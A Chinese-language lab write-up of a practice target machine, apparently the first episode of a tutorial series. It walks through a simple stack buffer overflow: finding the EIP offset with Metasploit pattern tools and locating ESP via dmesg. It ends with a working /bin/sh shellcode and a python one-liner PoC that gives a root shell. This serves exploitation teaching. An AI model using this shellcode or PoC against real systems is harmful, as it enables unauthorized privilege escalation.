将gdb转换为intel格式的汇编

set disassembly-flavor att

然后反编译main()函数

disas main

 

![](../Images/0976c7854d4b6956bf968592ecb02daf.png)

通过输入 500 个 a ，测试发现溢出  

 

![](../Images/e78d7b7ee32c159e604820e3f66ff531.png)

![](../Images/ed5f6354f31f5b0d893887f8cb62a48b.png)

   

判断系统的地址随机化是否开启

sysctl -a --pattern "randomize"

 

![](../Images/63ddae276d5ab693fb8d93e74e5c29a7.png)

0 表示关闭，地址随机化未开启也就是 ASLR 未启用（后面基本上都需要绕过 ASLR 保护）  

此处可以通过将文件下载到本地，然后使用 checksec 脚本 检查是否开启了一些常见的保护。

现在是需要确定 EIP 的具体位置，可以使用 Metasploit 的一个组件来确定

/usr/share/metasploit-framework/tools/exploit/pattern\_create.rb -l 500

使用 pattern\_create.rb 生成一串唯一格式的字符串

 

![](../Images/7c949116be0faf279e5ff99424dbc6d3.png)

![](../Images/bcab75c5afad8df763459d443bd42678.png)

   

溢出在 0x316d4130 位置

现在通过另外一个组件 pattern\_offsec 确定位置

/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb -q 0x316d4130 -l 500

 

![](../Images/e299fb7dc1e306fb6f11773ede621c88.png)

确定位置为 362  

验证一下

生成362个A + 4个B

 

![](../Images/e41a3b70cefdbbf0b68db1b9d722725c.png)

![](../Images/03d87d083c273e64ebde554d2f399fba.png)

   

验证成功

接下来确定ESP的位置 需要通过ESP指向我们想利用的shellcode

此处我们直接使用dmesg来确定ESP的位置（dmesg用于检查或控制内核环缓冲区。）

一般在gdb测试溢出然后挂载

可直接使用

dmesg | tail -1

dmesg | tail -2

dmesg | tail -3

来看dmesg最后几行的信息

 

![](../Images/0ed1b814c0e448ff940c11c69833ecad.png)

确定为 0xbffff510  

根据地址从低到高规则：使用的时候为 \\x10\\xf5\\xff\\xbf

需要用到的 shellcode

\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80

根据前面的信息 最后的POC为：

$(python -c ‘print “A” \* 362 + “\\x10\\xf5\\xff\\xbf” + “\\x90” \* 60 + “x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80”’)

 

![](../Images/5d8269b9fa13bd0e342afb6f56c4413b.png)

成功溢出 拿下 Root  

 

## **个人感悟**

以上的内容是最简单的缓冲区溢出，思路就是 确定 EIP ，找到 ESP ，然后通过 ESP 跳到我们的 shellcode 代码，让系统执行我们的代码。因为 ASLR、NX 这些常见的防护都没开，所以这个 BOF 的难度是很低的，随着后面的更新，大家会逐渐见到更多的情况，如何去绕过保护。

这是一篇为了配合 Exploit 编写教程而专门打的靶机。因为那个教程太老了，虽然很多思路也用的上，但不是特别方便复现练习，所以自己也写个 跟着靶机 Writeup 学 BOF。在内容上很多地方只是说 我们下一步要怎么做，会附带一些解释，但没有特别详细的解释，详细的解释请查看 我的翻译文章：Exploit 编写教程。

关于更新与集数：暂定 6 集，周更吧。根据实际情况再调整。这是第一季。
